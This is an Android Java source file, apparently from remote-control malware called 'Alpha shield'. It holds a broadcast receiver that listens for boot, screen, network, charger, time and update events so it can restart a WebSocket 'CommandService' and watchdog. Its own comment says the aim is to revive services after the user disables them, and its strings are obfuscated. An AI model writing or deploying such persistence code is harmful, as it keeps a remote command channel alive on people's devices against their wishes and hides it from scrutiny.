package com.alpha.shield;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import org.lsposed.lsparanoid.Obfuscate;

/**
 * BootReceiver — Alpha's resurrection broadcaster.
 *
 * Registered for every system event that can be used to restart
 * services after the OS kills or the user disables them.
 *
 * Events handled:
 *   BOOT_COMPLETED            — standard boot
 *   LOCKED_BOOT_COMPLETED     — API 24+: fires before user unlocks (direct-boot)
 *   QUICKBOOT_POWERON         — HTC/ASUS fast boot
 *   ACTION_MY_PACKAGE_REPLACED— own APK updated — restart
 *   CONNECTIVITY_CHANGE       — network state change (re-arm WebSocket)
 *   SCREEN_ON / USER_PRESENT  — screen wake / keyguard dismiss → re-arm
 *   ACTION_POWER_CONNECTED    — charger attached (device less likely to be killed)
 *   ACTION_TIME_CHANGED       — time/date/timezone change (can cancel alarms)
 *   TIMEZONE_CHANGED          — same
 *   ACTION_ALARM_HEARTBEAT    — fired by our own AlarmManager
 *   ACTION_DOZE_HEARTBEAT     — fired by our setExactAndAllowWhileIdle alarm
 *   PACKAGE_REPLACED          — fired when any package updates (keeps us alive)
 */
@Obfuscate
public class BootReceiver extends BroadcastReceiver {

    private static final String TAG = "BootRx";

    public static final String ACTION_ALARM_HEARTBEAT =
            "com.alpha.shield.ALARM_HEARTBEAT";
    public static final String ACTION_DOZE_HEARTBEAT  =
            "com.alpha.shield.DOZE_HEARTBEAT";

    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (intent == null || intent.getAction() == null) return;
        String action = intent.getAction();
        Log.d(TAG, "rx: " + action);

        switch (action) {
            // ── Boot events ───────────────────────────────────────────────────
            case Intent.ACTION_BOOT_COMPLETED:
            case "android.intent.action.LOCKED_BOOT_COMPLETED":
            case "com.htc.intent.action.QUICKBOOT_POWERON":
            case "android.intent.action.QUICKBOOT_POWERON":
                startAll(ctx);
                break;

            // ── Own package updated ───────────────────────────────────────────
            case Intent.ACTION_MY_PACKAGE_REPLACED:
                startAll(ctx);
                break;

            // ── Network change ────────────────────────────────────────────────
            case "android.net.conn.CONNECTIVITY_CHANGE":
                // Re-arm WebSocket when connectivity returns
                ensureCommandService(ctx);
                rearmAlarms(ctx);
                break;

            // ── Screen on / user present ─────────────────────────────────────
            case Intent.ACTION_SCREEN_ON:
            case Intent.ACTION_USER_PRESENT:
                ensureCommandService(ctx);
                break;

            // ── Charging ─────────────────────────────────────────────────────
            case Intent.ACTION_POWER_CONNECTED:
                // Device is less likely to be killed while charging
                ensureCommandService(ctx);
                rearmAlarms(ctx);
                break;

            // ── Time changes (can reset alarms) ──────────────────────────────
            case Intent.ACTION_TIME_CHANGED:
            case Intent.ACTION_TIMEZONE_CHANGED:
            case Intent.ACTION_DATE_CHANGED:
                rearmAlarms(ctx);
                break;

            // ── Our own alarm heartbeats ──────────────────────────────────────
            case ACTION_ALARM_HEARTBEAT:
            case ACTION_DOZE_HEARTBEAT:
                ensureCommandService(ctx);
                rearmAlarms(ctx);    // schedule next alarm
                break;
        }
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private void startAll(Context ctx) {
        startWatchdog(ctx);
        // Give WatchdogService 1.5 s to start, then check CommandService
        new android.os.Handler(android.os.Looper.getMainLooper())
                .postDelayed(() -> ensureCommandService(ctx), 1500);
        rearmAlarms(ctx);
    }

    private void startWatchdog(Context ctx) {
        try {
            Intent i = new Intent(ctx, WatchdogService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(i);
            } else {
                ctx.startService(i);
            }
        } catch (Exception e) {
            Log.e(TAG, "startWatchdog: " + e.getMessage());
        }
    }

    private void ensureCommandService(Context ctx) {
        if (!CommandService.isAlive()) {
            Log.w(TAG, "CommandService dead — restarting via WatchdogService");
            startWatchdog(ctx);
        }
    }

    private void rearmAlarms(Context ctx) {
        try {
            new SurvivalManager(ctx).armAlarmClock();
        } catch (Exception e) {
            Log.e(TAG, "rearm: " + e.getMessage());
        }
    }
}
